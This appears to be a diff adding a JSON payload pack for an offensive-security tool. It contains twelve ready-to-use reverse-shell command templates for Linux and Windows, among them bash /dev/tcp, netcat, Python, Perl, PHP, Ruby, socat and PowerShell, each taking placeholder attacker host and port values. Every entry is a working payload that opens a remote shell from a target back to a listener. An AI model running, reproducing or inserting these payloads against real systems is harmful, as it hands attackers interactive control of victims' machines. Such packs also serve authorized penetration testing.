@@ -1,0 +1,194 @@
+{
+  "pack": "builtin-rce-revshell",
+  "category": "rce",
+  "source": "builtin",
+  "license": "MIT",
+  "templates": [
+    {
+      "id": "rce-rev-bash-tcp",
+      "name": "Bash /dev/tcp",
+      "category": "rce",
+      "platform": "linux",
+      "template": "bash -i >& /dev/tcp/<<POAD_LHOST>>/<<POAD_LPORT>> 0>&1",
+      "required": [
+        "lhost",
+        "lport"
+      ],
+      "tags": [
+        "revshell",
+        "bash"
+      ],
+      "notes": "Needs a bash with /dev/tcp support."
+    },
+    {
+      "id": "rce-rev-bash-196",
+      "name": "Bash fd 196",
+      "category": "rce",
+      "platform": "linux",
+      "template": "0<&196;exec 196<>/dev/tcp/<<POAD_LHOST>>/<<POAD_LPORT>>;sh <&196 >&196 2>&196",
+      "required": [
+        "lhost",
+        "lport"
+      ],
+      "tags": [
+        "revshell",
+        "bash"
+      ]
+    },
+    {
+      "id": "rce-rev-sh-mkfifo",
+      "name": "sh mkfifo + nc",
+      "category": "rce",
+      "platform": "linux",
+      "template": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <<POAD_LHOST>> <<POAD_LPORT>> >/tmp/f",
+      "required": [
+        "lhost",
+        "lport"
+      ],
+      "tags": [
+        "revshell",
+        "nc"
+      ],
+      "notes": "Portable nc reverse shell (no -e needed)."
+    },
+    {
+      "id": "rce-rev-nc-e",
+      "name": "nc -e",
+      "category": "rce",
+      "platform": "linux",
+      "template": "nc <<POAD_LHOST>> <<POAD_LPORT>> -e /bin/sh",
+      "required": [
+        "lhost",
+        "lport"
+      ],
+      "tags": [
+        "revshell",
+        "nc"
+      ],
+      "notes": "Only works with nc builds that support -e."
+    },
+    {
+      "id": "rce-rev-python3",
+      "name": "Python3",
+      "category": "rce",
+      "platform": "linux",
+      "template": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<<POAD_LHOST>>\",<<POAD_LPORT>>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+      "required": [
+        "lhost",
+        "lport"
+      ],
+      "tags": [
+        "revshell",
+        "python"
+      ]
+    },
+    {
+      "id": "rce-rev-perl",
+      "name": "Perl",
+      "category": "rce",
+      "platform": "linux",
+      "template": "perl -e 'use Socket;$i=\"<<POAD_LHOST>>\";$p=<<POAD_LPORT>>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+      "required": [
+        "lhost",
+        "lport"
+      ],
+      "tags": [
+        "revshell",
+        "perl"
+      ]
+    },
+    {
+      "id": "rce-rev-php",
+      "name": "PHP",
+      "category": "rce",
+      "platform": "linux",
+      "template": "php -r '$sock=fsockopen(\"<<POAD_LHOST>>\",<<POAD_LPORT>>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+      "required": [
+        "lhost",
+        "lport"
+      ],
+      "tags": [
+        "revshell",
+        "php"
+      ]
+    },
+    {
+      "id": "rce-rev-ruby",
+      "name": "Ruby",
+      "category": "rce",
+      "platform": "linux",
+      "template": "ruby -rsocket -e'f=TCPSocket.open(\"<<POAD_LHOST>>\",<<POAD_LPORT>>).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+      "required": [
+        "lhost",
+        "lport"
+      ],
+      "tags": [
+        "revshell",
+        "ruby"
+      ]
+    },
+    {
+      "id": "rce-rev-socat",
+      "name": "socat",
+      "category": "rce",
+      "platform": "linux",
+      "template": "socat TCP:<<POAD_LHOST>>:<<POAD_LPORT>> EXEC:/bin/sh",
+      "required": [
+        "lhost",
+        "lport"
+      ],
+      "tags": [
+        "revshell",
+        "socat"
+      ],
+      "notes": "Pair with: socat file:`tty`,raw,echo=0 TCP-L:PORT"
+    },
+    {
+      "id": "rce-rev-socat-tty",
+      "name": "socat full TTY",
+      "category": "rce",
+      "platform": "linux",
+      "template": "socat TCP:<<POAD_LHOST>>:<<POAD_LPORT>> EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
+      "required": [
+        "lhost",
+        "lport"
+      ],
+      "tags": [
+        "revshell",
+        "socat"
+      ],
+      "notes": "Gives a fully interactive TTY on the catcher side."
+    },
+    {
+      "id": "rce-rev-powershell",
+      "name": "PowerShell TCP",
+      "category": "rce",
+      "platform": "windows",
+      "template": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('<<POAD_LHOST>>',<<POAD_LPORT>>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
+      "required": [
+        "lhost",
+        "lport"
+      ],
+      "tags": [
+        "revshell",
+        "powershell"
+      ]
+    },
+    {
+      "id": "rce-rev-nc-win",
+      "name": "nc.exe -e cmd",
+      "category": "rce",
+      "platform": "windows",
+      "template": "nc.exe <<POAD_LHOST>> <<POAD_LPORT>> -e cmd.exe",
+      "required": [
+        "lhost",
+        "lport"
+      ],
+      "tags": [
+        "revshell",
+        "nc"
+      ],
+      "notes": "Requires nc.exe on target."
+    }
+  ]
+}
